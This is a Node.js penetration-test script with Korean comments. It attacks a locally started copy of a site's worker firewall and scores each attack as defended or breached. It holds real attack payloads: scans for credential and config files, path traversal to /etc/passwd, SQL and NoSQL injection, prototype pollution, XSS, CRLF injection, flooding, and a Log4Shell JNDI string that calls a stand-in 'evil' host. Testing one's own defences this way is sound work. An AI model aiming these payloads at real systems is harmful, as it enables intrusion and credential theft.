// === AI 해커: 리노 홈페이지(워커 방화벽) 침투 테스트 ===
// 실제 HTTP로 공격을 퍼붓고, "뚫렸는지"를 공격마다 정한 기준으로 채점해요.
// 뚫림 기준: 비밀값(토큰/키) 유출 · 방화벽 우회로 내부(Gist/Notion) 도달 · 차단돼야 할 요청이 통과 · 서버 오류 노출.
import { start, stop, backend } from './serve-worker.mjs';

const SECRETS = ['ghp_SECRET_token_value_must_never_leak_1234567890', 'vapidSecretPrivateKeyMustNeverLeak', 'calSecretAccessKey20charsLong!!', 'ntn_SECRET_notion_token_never_leak'];
const ORIGIN = 'https://linuscompany.co.kr';
let BASE = '';
let ipCounter = 0;
const freshIP = () => '198.51.' + Math.floor(ipCounter / 250 % 250) + '.' + ((ipCounter++ % 250) + 1); // 공격마다 새 IP로: IP 차단이 다음 테스트를 오염시키지 않게

async function hit(path, { method = 'GET', body, headers = {}, origin, ct = 'application/json', ip } = {}) {
  const h = { 'X-Test-IP': ip || freshIP(), ...headers };
  if (origin !== null) h['Origin'] = origin || ORIGIN;
  if (body !== undefined && ct !== null && !('Content-Type' in h)) h['Content-Type'] = ct;
  let r, text;
  try {
    r = await fetch(BASE + path, { method, headers: h, body });
    text = await r.text();
  } catch (e) { return { status: 0, text: 'FETCH_ERR ' + e.message, headers: {}, err: e.message }; }
  const hd = {}; r.headers.forEach((v, k) => (hd[k] = v));
  return { status: r.status, text, headers: hd };
}

const leaked = (res) => SECRETS.some((s) => (res.text || '').includes(s) || JSON.stringify(res.headers).includes(s));
const results = [];
function record(cat, name, res, breached, note) {
  const secret = leaked(res);
  const breach = breached || secret;
  results.push({ cat, name, status: res.status, breach, secret, note: note || '' });
}

// ---------- 공격 묶음 ----------
async function recon() {
  // 1. 흔한 민감 경로·관리자 경로 훑기 (스캐너처럼)
  const paths = ['/.env', '/.git/config', '/wp-login.php', '/wp-admin/', '/admin', '/phpmyadmin/', '/config.json', '/.aws/credentials', '/actuator/env', '/server-status', '/.well-known/security.txt', '/backup.sql', '/api/../../etc/passwd', '/index.php', '/xmlrpc.php', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'];
  for (const p of paths) {
    const res = await hit(p, { ip: freshIP() });
    // 뚫림 = 내부 도달 또는 2xx/5xx 노출
    record('정찰/스캔', `GET ${p}`, res, (res.status >= 200 && res.status < 300) || backendTouched(res), res.status === 403 ? '차단' : '');
  }
}

let lastBackendLen = 0;
function backendTouched() { const n = backend.hits.length; const t = n > lastBackendLen; lastBackendLen = n; return t; }

async function secretsExtract() {
  // 2. 비밀값을 직접 끌어내려는 시도
  const tries = [
    ['/health', {}],
    ['/health?check=1', {}],
    ['/health?debug=1&verbose=true', {}],
    ['/notify', { method: 'POST', body: '{"id":"../../../../etc/passwd"}' }],
    ['/notify', { method: 'POST', body: JSON.stringify({ id: '${env.GIST_TOKEN}' }) }],
    ['/login', { method: 'POST', body: '{"email":"x@y.co","ph":"' + 'a'.repeat(64) + '","__debug":true,"dump":"env"}' }],
    ['/cal', { method: 'POST', headers: { 'x-cal-key': 'calSecretAccessKey20charsLong!!' }, body: '{"op":"check"}' }], // 올바른 키면 설정 일부가 돌아올 수 있음 — 비밀 자체가 새면 뚫림
  ];
  for (const [p, o] of tries) {
    const res = await hit(p, { ip: freshIP(), ...o });
    record('비밀값 탈취', `${o.method || 'GET'} ${p}`, res, false, res.status === 200 ? 'ok(200)' : String(res.status));
  }
}

async function authBypass() {
  // 3. 로그인/승인 우회
  const t = [
    ['빈 비밀번호', { email: 'admin@linuscompany.co.kr', ph: '' }],
    ['SQL류 주입', { email: "admin@linuscompany.co.kr'--", ph: "' OR '1'='1" }],
    ['해시 대신 평문', { email: 'admin@linuscompany.co.kr', ph: 'password' }],
    ['role 강제 주입', { email: 'x@y.co', ph: 'a'.repeat(64), role: 'admin', status: 'approved' }],
    ['status 주입', { email: 'new@y.co', ph: 'a'.repeat(64), status: 'approved' }],
    ['프로토타입 오염', { email: 'x@y.co', ph: 'a'.repeat(64), '__proto__': { role: 'admin' } }],
    ['NoSQL류 객체', { email: { $ne: null }, ph: { $ne: null } }],
    ['해시 형식 위조', { email: 'admin@linuscompany.co.kr', ph: 'DEADBEEF' + 'a'.repeat(56) }],
  ];
  for (const [name, body] of t) {
    const res = await hit('/login', { method: 'POST', body: JSON.stringify(body), ip: freshIP() });
    let ok = false; try { ok = JSON.parse(res.text).ok === true; } catch {}
    // 뚫림 = 로그인 성공(토큰 획득) 또는 500 오류
    record('인증 우회', name, res, ok || res.status >= 500, ok ? '로그인됨!' : String(res.status));
  }
  // 승인 안 된 가입자가 바로 로그인되나
  const res = await hit('/signup', { method: 'POST', body: JSON.stringify({ email: 'intruder@y.co', name: '침입', ph: 'a'.repeat(64) }), ip: freshIP() });
  record('인증 우회', '가입 직후 상태', res, /"status":"approved"/.test(res.text), res.text.slice(0, 40));
}

async function originSpoof() {
  // 4. CORS/Origin 위조로 남의 사이트에서 호출
  const origins = ['https://evil.example', 'https://linuscompany.co.kr.evil.example', 'http://linuscompany.co.kr', 'https://linuscompany-co-kr.evil', 'null', ''];
  for (const o of origins) {
    const res = await hit('/login', { method: 'POST', origin: o, body: JSON.stringify({ email: 'a@b.co', ph: 'a'.repeat(64) }), ip: freshIP() });
    const acao = res.headers['access-control-allow-origin'] || '';
    // 뚫림 = 공격 Origin이 그대로 허용되거나, 요청이 내부까지 처리됨(=403이 아님)
    const reflected = acao === o && o !== '';
    record('Origin 위조', `Origin: ${o || '(없음)'}`, res, reflected || (res.status !== 403 && o.includes('evil')), `status ${res.status}, ACAO=${acao}`);
  }
  // preflight로 임의 헤더 허용되나
  const pf = await hit('/login', { method: 'OPTIONS', origin: 'https://evil.example', headers: { 'Access-Control-Request-Headers': 'authorization,x-admin' }, ip: freshIP() });
  record('Origin 위조', 'preflight 임의 헤더', pf, (pf.headers['access-control-allow-origin'] === 'https://evil.example'), `ACAO=${pf.headers['access-control-allow-origin']}`);
}

async function injection() {
  // 5. 주입/우회 인코딩 — 스캐너 탐지를 피해 보려는 변형
  const t = [
    ['경로 역추적', '/notify/..%2f..%2f.env'],
    ['이중 인코딩', '/%2e%2e/%2e%2e/etc/passwd'],
    ['널바이트', '/health%00.php'],
    ['대소문자 우회', '/WP-LOGIN.PHP'],
    ['쿼리 위장', '/health?x=/wp-admin/'],
    ['XSS 반사 시도', '/health?q=<script>alert(1)</script>'],
    ['SQLi 쿼리', '/health?id=1%20UNION%20SELECT%20password%20FROM%20users'],
    ['로그4j', '/health?u=${jndi:ldap://evil/x}'],
    ['CRLF 주입', '/health?x=a%0d%0aSet-Cookie:admin=1'],
  ];
  for (const [name, p] of t) {
    const res = await hit(p, { ip: freshIP() });
    const reflectsXSS = /<script>/.test(res.text);
    const crlf = 'set-cookie' in res.headers;
    record('주입/우회', name, res, (res.status >= 200 && res.status < 300 && backendTouched()) || reflectsXSS || crlf, `status ${res.status}`);
  }
}

async function floodAndDoS() {
  // 6. 과부하/대형 본문
  const big = 'a'.repeat(2 * 1024 * 1024);
  const r1 = await hit('/notify', { method: 'POST', body: JSON.stringify({ id: big }), ip: freshIP() });
  record('과부하/대형', '2MB 알림 본문', r1, r1.status === 200 || backendTouched(), `status ${r1.status}`);
  const r2 = await hit('/cal', { method: 'POST', headers: { 'x-cal-key': 'wrong', 'content-length': '999999999' }, body: JSON.stringify({ op: 'sync', push: Array(100000).fill({ title: 'x', date: '2026-01-01' }) }), ip: freshIP() });
  record('과부하/대형', '거대 일정 배열', r2, r2.status === 200 || backendTouched(), `status ${r2.status}`);
  // 길이를 속인 본문
  const r3 = await hit('/notify', { method: 'POST', headers: { 'content-length': '5' }, body: JSON.stringify({ id: 'x'.repeat(100000) }), ip: freshIP() });
  record('과부하/대형', '길이 위조 본문', r3, r3.status === 200 || backendTouched(), `status ${r3.status}`);

  // 7. 속도 제한이 실제로 막는지 (한 IP로 120발)
  const ip = freshIP(); let ok200 = 0, blocked = 0;
  for (let i = 0; i < 120; i++) { const r = await hit('/health', { ip }); if (r.status === 200) ok200++; else blocked++; }
  record('과부하/대형', '단일 IP 120회 연타', { status: 0, text: '', headers: {} }, blocked === 0, `통과 ${ok200} / 차단 ${blocked}`);
}

async function methodAndProto() {
  // 8. 엉뚱한 메서드/경로
  for (const m of ['PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT']) {
    const res = await hit('/login', { method: m, ip: freshIP(), body: m === 'TRACE' || m === 'CONNECT' ? undefined : '{}' });
    record('메서드/프로토콜', `${m} /login`, res, res.status >= 200 && res.status < 300, `status ${res.status}`);
  }
  // notify를 GET으로 (쓰기 경로를 읽기로)
  const g = await hit('/notify', { ip: freshIP() });
  record('메서드/프로토콜', 'GET /notify', g, g.status < 400, `status ${g.status}`);
}

async function headerSecurity() {
  // 9. 응답에 보안 헤더가 붙는지 (클릭재킹/스니핑 방어)
  const res = await hit('/health', { ip: freshIP() });
  const need = { 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'referrer-policy': 'no-referrer', 'cache-control': 'no-store' };
  for (const [k, v] of Object.entries(need)) {
    const got = res.headers[k] || '';
    record('응답 헤더', `${k}: ${v}`, res, !new RegExp(v, 'i').test(got), got ? `있음(${got})` : '없음!');
  }
  const csp = res.headers['content-security-policy'] || '';
  record('응답 헤더', 'CSP frame-ancestors none', res, !/frame-ancestors 'none'/.test(csp), csp ? '있음' : '없음!');
}

async function main() {
  BASE = 'http://127.0.0.1:' + (await start(0));
  const groups = [recon, secretsExtract, authBypass, originSpoof, injection, floodAndDoS, methodAndProto, headerSecurity];
  for (const g of groups) { lastBackendLen = backend.hits.length; await g(); }
  await stop();

  // ----- 리포트 -----
  const byCat = {};
  for (const r of results) { (byCat[r.cat] ||= []).push(r); }
  const breaches = results.filter((r) => r.breach);
  console.log('\n================  AI 해커 침투 테스트 결과  ================\n');
  for (const [cat, rows] of Object.entries(byCat)) {
    const b = rows.filter((r) => r.breach).length;
    console.log(`▌ ${cat}  —  ${rows.length}건 시도, ${b ? '⚠️ ' + b + '건 뚫림' : '✅ 전부 방어'}`);
    for (const r of rows) {
      const mark = r.breach ? (r.secret ? '🔴 유출' : '🔴 뚫림') : '🟢 방어';
      console.log(`    ${mark}  [${String(r.status).padStart(3)}]  ${r.name}${r.note ? '  · ' + r.note : ''}`);
    }
    console.log('');
  }
  console.log('===========================================================');
  console.log(`총 ${results.length}건 공격 · 뚫림 ${breaches.length}건 · 비밀값 유출 ${results.filter((r) => r.secret).length}건`);
  console.log(`방화벽을 통과해 내부(Gist/Notion)까지 닿은 요청: ${backend.hits.length}건 (정상 경로의 정상 요청만 닿아야 정상)`);
  console.log(breaches.length === 0 ? '\n✅ 결론: 모든 공격을 방어했습니다.' : '\n⚠️ 결론: 아래 항목이 뚫렸습니다 → ' + breaches.map((b) => b.cat + '/' + b.name).join(', '));
  process.exit(breaches.length === 0 ? 0 : 1); // 뚫림이 있으면 CI가 실패하도록 0이 아닌 코드로 끝내요

}
main();
